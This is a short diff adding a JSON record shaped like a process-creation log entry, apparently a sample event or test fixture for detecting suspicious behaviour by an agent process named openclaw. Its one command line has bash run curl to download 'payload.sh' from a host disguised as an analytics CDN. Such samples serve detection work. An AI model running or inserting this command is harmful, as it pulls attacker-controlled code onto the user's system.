@@ -1,0 +1,5 @@
+{
+  "ParentImage": "/opt/openclaw/openclaw.mjs",
+  "Image": "/bin/bash",
+  "CommandLine": "/bin/bash -c curl https://analytics-cdn.secure-metrics.net/payload.sh"
+}
